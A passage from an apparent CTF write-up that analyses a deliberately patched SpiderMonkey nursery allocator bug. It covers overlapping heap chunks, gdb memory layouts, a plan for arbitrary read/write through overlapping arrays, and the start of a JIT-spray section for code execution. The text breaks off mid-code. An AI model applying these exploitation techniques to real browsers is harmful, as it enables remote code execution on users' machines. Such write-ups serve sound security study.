</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">inline</span> <span style="color:#078;font-weight:bold">void</span><span style="color:#555">*</span> js<span style="color:#555">::</span>Nursery<span style="color:#555">::</span>allocate(size_t size) {
</span></span><span style="display:flex;"><span>  MOZ_ASSERT(isEnabled());
</span></span><span style="display:flex;"><span>  MOZ_ASSERT(<span style="color:#555">!</span>JS<span style="color:#555">::</span>RuntimeHeapIsBusy());
</span></span><span style="display:flex;"><span>  MOZ_ASSERT(CurrentThreadCanAccessRuntime(runtime()));
</span></span><span style="display:flex;"><span>  MOZ_ASSERT_IF(currentChunk_ <span style="color:#555">==</span> currentStartChunk_,
</span></span><span style="display:flex;"><span>                position() <span style="color:#555">&gt;=</span> currentStartPosition_);
</span></span><span style="display:flex;"><span>  MOZ_ASSERT(position() <span style="color:#555">%</span> CellAlignBytes <span style="color:#555">==</span> <span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>  MOZ_ASSERT(size <span style="color:#555">%</span> CellAlignBytes <span style="color:#555">==</span> <span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#099">#ifdef JS_GC_ZEAL
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>  <span style="color:#069;font-weight:bold">if</span> (gc<span style="color:#555">-&gt;</span>hasZealMode(ZealMode<span style="color:#555">::</span>CheckNursery)) {
</span></span><span style="display:flex;"><span>    size <span style="color:#555">+=</span> <span style="color:#069;font-weight:bold">sizeof</span>(Canary);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#099">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (MOZ_UNLIKELY(currentEnd() <span style="color:#555">&lt;</span> position() <span style="color:#555">+</span> size)) {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> <span style="color:#c0f">moveToNextChunkAndAllocate</span>(size);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">void</span><span style="color:#555">*</span> thing <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">void</span><span style="color:#555">*</span>)position();
</span></span><span style="display:flex;"><span>  position_ <span style="color:#555">=</span> position() <span style="color:#555">+</span> size;
</span></span><span style="display:flex;"><span>  <span style="color:#09f;font-style:italic">// We count this regardless of the profiler&#39;s state, assuming that it costs
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>  <span style="color:#09f;font-style:italic">// just as much to count it, as to check the profiler&#39;s state and decide not
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>  <span style="color:#09f;font-style:italic">// to count it.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>  stats().noteNurseryAlloc();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  DebugOnlyPoison(thing, JS_ALLOCATED_NURSERY_PATTERN, size,
</span></span><span style="display:flex;"><span>                  MemCheckKind<span style="color:#555">::</span>MakeUndefined);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#099">#ifdef JS_GC_ZEAL
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>  <span style="color:#069;font-weight:bold">if</span> (gc<span style="color:#555">-&gt;</span>hasZealMode(ZealMode<span style="color:#555">::</span>CheckNursery)) {
</span></span><span style="display:flex;"><span>    writeCanary(position() <span style="color:#555">-</span> <span style="color:#069;font-weight:bold">sizeof</span>(Canary));
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#099">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> thing;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, let&rsquo;s check what is <code>position_</code> means</p>
<p><strong>Nursery.h</strong></p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  // Pointer to the first unallocated byte in the nursery.
</span></span><span style="display:flex;"><span>  uintptr_t position_;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ah, reading through those methods, we can deduce what this <code>allocateBuffer</code> do. So the summary is:</p>
<ul>
<li>Nursery heap has a pointer to the first unallocated byte called <code>position_</code></li>
<li>Everytime there is an allocation, the <code>allocate</code> will simply return the current <code>position_</code> address, and then shift the <code>position_</code> by n-size</li>
</ul>
<p>Turn out, the way Nursery heap do allocation is quite simple. Now, let&rsquo;s back to the <code>reallocateBuffer</code> method those were patched for this challenge, especially on the patched line of codes.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">void</span><span style="color:#555">*</span> newBuffer <span style="color:#555">=</span> allocateBuffer(zone, newBytes);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#09f;font-style:italic">// The nursery cannot make use of the returned slots data.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>  <span style="color:#069;font-weight:bold">if</span> (newBytes <span style="color:#555">&lt;</span> oldBytes) {
</span></span><span style="display:flex;"><span>    position_ <span style="color:#555">-=</span> oldBytes;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> oldBuffer;
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></td></tr></table>
</div>
</div><p>The bug is there will be overlapping chunk after the call <code>reallocateBuffer</code>. For example:</p>
<ul>
<li>Suppose that <code>position_</code> is pointing to <code>x</code></li>
<li>And then you allocate <code>A</code> chunk with size 0x100
<ul>
<li><code>A</code> will point to <code>x</code></li>
<li><code>position_</code> will point to <code>x+0x100</code></li>
</ul>
</li>
<li>And then you allocate <code>B</code> chunk with size 0x30
<ul>
<li><code>B</code> will point to <code>x+0x100</code></li>
<li><code>position_</code> will point to <code>x+0x130</code></li>
</ul>
</li>
<li>And then let say you re-allocate <code>A</code> with size 0x20. Due to the bug, the <code>position_</code> will be corrupted. Below is the detail what happens:
<ul>
<li><code>reallocateBuffer</code> will allocate new chunk with size 0x20
<ul>
<li>Now, the <code>position_</code> will point to <code>x+0x150</code></li>
</ul>
</li>
<li>And then, because the <code>newBytes</code> is less than <code>oldBytes</code> (0x20 &lt; 0x100), position_ will point to <code>x+0x50</code>. Notes that the <code>position_</code> is messed up now.</li>
</ul>
</li>
<li>And then you allocate <code>C</code> chunk with size 0x100
<ul>
<li><code>C</code> will point to <code>x+0x50</code></li>
<li><code>position_</code> will now point to 0x150</li>
</ul>
</li>
<li>Now, <code>C</code> and <code>B</code> chunk is overlapping. If we able to do some write to the chunk <code>C</code>, we can forge the <code>B</code> chunk metadata.</li>
</ul>
<p>Now we found the bug, it&rsquo;s time for us to think more on how to create the exploitation plan</p>
<h3 id="exploitation-plan">Exploitation Plan <a href="#exploitation-plan" class="anchor">#</a></h3>
<p>Now we know the bug, we need to know three things before we can actually exploit the bug:</p>
<ul>
<li>How to trigger <code>allocateBuffer</code> in Nursery</li>
<li>What is the chunk metadata contents stored</li>
<li>How to trigger <code>reallocateBuffer</code> in Nursery</li>
</ul>
<h4 id="understanding-the-spidermonkey-engine">Understanding the SpiderMonkey engine <a href="#understanding-the-spidermonkey-engine" class="anchor">#</a></h4>
<p>Reading through this <a href="https://doar-e.github.io/blog/2019/06/17/a-journey-into-ionmonkey-root-causing-cve-2019-9810/#the-nursery" target="_blank" rel="noopener">article</a> will help us to answer the first and third question. To trigger it, we actually can just create a new array object. For example:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>a = new Array(0x7e)
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above LOC will call <code>allocateBuffer</code> in the process. To understand it better, let&rsquo;s fire up our gdb. Below is the script that I used to set the breakpoint.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>b *js::Nursery::allocate+128
</span></span><span style="display:flex;"><span>b *js::Nursery::reallocateBuffer(JS::Zone*, js::gc::Cell*, void*, unsigned long, unsigned long)+643
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>The first breakpoint is pointing to the LOC <code>position_ = position() + size;</code> inside <code>allocate</code></li>
<li>The second is pointing to the LOC <code>position_ -= oldBytes</code> inside <code>reallocateBuffer</code></li>
</ul>
<p>Now, try to initialize array like above, and lookup at the gdb.
<p class="markdown-image">
  <img src="https://i.imgur.com/4Y0mFOk.png" alt=""  />
</p></p>
<p>As you can see in the trace, it is true that creating an array array will call <code>js::Nursery::allocate</code>. The chunk address is the <code>$rax</code> value that you see in the above picture.</p>
<p>Stepping through the gdb, turn out during constructing an array with size 0x7e, it will allocate 3 times with respective size 0x30, 0x400, and 0x20 (To understand why the allocation is like that, I recommend you to read this <a href="https://doar-e.github.io/blog/2019/06/17/a-journey-into-ionmonkey-root-causing-cve-2019-9810/#the-nursery" target="_blank" rel="noopener">article</a> which explain about it). Notes that these allocations size will varies based on your array size, which is why instead of calculating precisely, I&rsquo;ll just focus inspecting on the gdb layout.</p>
<p>Let&rsquo;s try to assign some value to our array.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>a[0]=0x1337
</span></span><span style="display:flex;"><span>a[1]=2.4303e-320 // Double representation of 0x1337 hex
</span></span><span style="display:flex;"><span>a.x = 0xbeef
</span></span><span style="display:flex;"><span>a.y = 0x4141
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, let&rsquo;s inspect the chunk content now (start from the first one).</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef➤  x/50gx 0x1010a1c00690
</span></span><span style="display:flex;"><span>0x1010a1c00690: 0x00007ffff694e3f0      0x000010b870d60fe0
</span></span><span style="display:flex;"><span>0x1010a1c006a0: 0x00001010a1c009d0      0x00001010a1c006d0
</span></span><span style="display:flex;"><span>0x1010a1c006b0: 0x0000000000000000      0x0000007e00000000
</span></span><span style="display:flex;"><span>0x1010a1c006c0: 0x0000000200000000      0x0000007e00000005
</span></span><span style="display:flex;"><span>0x1010a1c006d0: 0xfff8800000001337      0x0000000000001337
</span></span><span style="display:flex;"><span>0x1010a1c006e0: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c006f0: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c00700: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c00710: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c00720: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c00730: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c00740: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c00750: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c00760: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c00770: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c00780: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c00790: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c007a0: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c007b0: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c007c0: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c007d0: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c007e0: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c007f0: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c00800: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c00810: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>gef➤  x/20gx 0x00001010a1c009d0
</span></span><span style="display:flex;"><span>0x1010a1c009d0: 0xfff880000000beef      0xfff8800000004141
</span></span><span style="display:flex;"><span>0x1010a1c009e0: 0x0000000000000000      0x00007ffff694e3f2
</span></span><span style="display:flex;"><span>0x1010a1c009f0: 0x0000000541410a50      0x0000003530373631
</span></span><span style="display:flex;"><span>0x1010a1c00a00: 0x0000000000000000      0x00007ffff694e3f2
</span></span><span style="display:flex;"><span>0x1010a1c00a10: 0x0000000413370a50      0x0000000039313934
</span></span><span style="display:flex;"><span>0x1010a1c00a20: 0x0000000000000000      0x00007ffff694e3f2
</span></span><span style="display:flex;"><span>0x1010a1c00a30: 0x0000000b00000250      0x2d65333033342e32
</span></span><span style="display:flex;"><span>0x1010a1c00a40: 0x0000000000303233      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c00a50: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1010a1c00a60: 0x0000000000000000      0x0000000000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>Some notable metadata that we can see:</p>
<ul>
<li>At address <code>0x1010a1c006a0</code>, we can see that it stored a pointer to the start of our properties.</li>
<li>At address <code>0x1010a1c006a8</code>, we can see that it stored a pointer to the start of our array elements.</li>
<li>At address <code>0x1010a1c006c0</code>, it store the count of elements that we have stored in the array.</li>
<li>Starting from address <code>0x1010a1c006d0</code>, it contains our array elements value.</li>
<li>Starting from address <code>0x00001010a1c009d0</code>, it contains our properties values.</li>
</ul>
<p>If you notice, there is a MSBs set on our first array elements value, while the second element doesn&rsquo;t have any MSBs set. The first element MSBs is called an object tag. Refering to the source code of it in <a href="https://github.com/mozilla/gecko-dev/blob/master/js/public/Value.h" target="_blank" rel="noopener">here</a>, to summarize it, every type in javascript has their own encoded tag set in the MSBs (Specifically 17-bits of their MSBs).</p>
<p>For example, as we can see in the GDB, for integer type, the MSBs that we saw is the integer tag, which is <code>0xffff8</code>. One of the unique type that doesn&rsquo;t have a tag is a Double (which is our second element), where it will use the whole address (8 bytes) to store the floating-point hex value representation of the Double.</p>
<p>Now we know about the metadata, our second question has been answered. Now, to answer the third question, as stated in the <a href="https://doar-e.github.io/blog/2019/06/17/a-journey-into-ionmonkey-root-causing-cve-2019-9810/#the-nursery" target="_blank" rel="noopener">article</a>, if we set the array length to let say 0, it will trigger <code>reallocateBuffer</code>. Let&rsquo;s try this in our gdb by executing below code</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>a.length=0
</span></span></code></pre></td></tr></table>
</div>
</div><p><p class="markdown-image">
  <img src="https://i.imgur.com/J59F5wF.png" alt=""  />
</p></p>
<p>As we can see in the above image, <code>reallocateBuffer</code> got triggered. Keep in mind that the bug is in this method, which mean after we set the array length, the Nursery pointer <code>position_</code> is now corrupted, and pointing to the wrong address.</p>
<h4 id="what-we-can-do-to-abuse-the-bug">What we can do to abuse the bug <a href="#what-we-can-do-to-abuse-the-bug" class="anchor">#</a></h4>
<p>Keep in mind that from our first initial analysis, we actually can create an overlapping chunk with the bug. Usually, in order to exploit this kind of challenge, we need to be able:</p>
<ul>
<li>Read any value stored in any address</li>
<li>Write any value to any address</li>
</ul>
<p>How to achieve this? Based on the general knowledge on how the js engine works, we actually can abuse the overlapping chunk by creating an overlapping array, where the the array elements overlap with another array metadata, which mean we can achieve the above conditions.</p>
<p>Suppose that we have two array B and C, where due to the overlapping chunk bugs, one of the array B elements is actually pointing to the array C metadata stored pointer. For example, what we can do with this condition:</p>
<ul>
<li>Read any value stored in any address by:
<ul>
<li>Calculate the B array offset, so that when we overwrite the B array elements, it will actually rewrite the C metadata which stored the address of its starting element</li>
<li>Overwrite it with the address that we want</li>
<li>Now, if you access c[0], it will leak the address value.</li>
</ul>
</li>
<li>Write any value to any address by:
<ul>
<li>Calculate the B array offset, so that when we overwrite the B array elements, it will actually rewrite the C metadata which stored the address of its starting element</li>
<li>Overwrite it with the address that we targeted</li>
<li>Now, if you assign value to c[0], it will overwrite the address that we targeted</li>
</ul>
</li>
</ul>
<p>With this, now we can do anything, expanding this to:</p>
<ul>
<li>Read any object address</li>
<li>Overwrite any object metadata</li>
</ul>
<h4 id="jit-spray">JIT Spray <a href="#jit-spray" class="anchor">#</a></h4>
<p>Of course read and write to any address isn&rsquo;t enough to trigger RCE, so we need to expand this more. In order to do this, we will use JIT Spraying attack.</p>
<p>SpiderMonkey use IonMonkey as their JIT engine, where it is a whole-method JIT.</p>
<p>To summarize, if we have a method that is frequently called, IonMonkey will JIT-ed the method, which mean it will compile the method, and put it in the JIT-ed code address area.</p>
<p>And what JIT Spraying attack is basically trying to smuggle our shellcode to the JIT-ed code address area (which has r-x permission).</p>
<p>After reading some articles, we actually can create a function contains a lot of Double constants, and then create a loop to call this methods so many times. If the code got jit-ed, the JIT-ed code address area will contains our Double constants. For example, let say we have this code</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
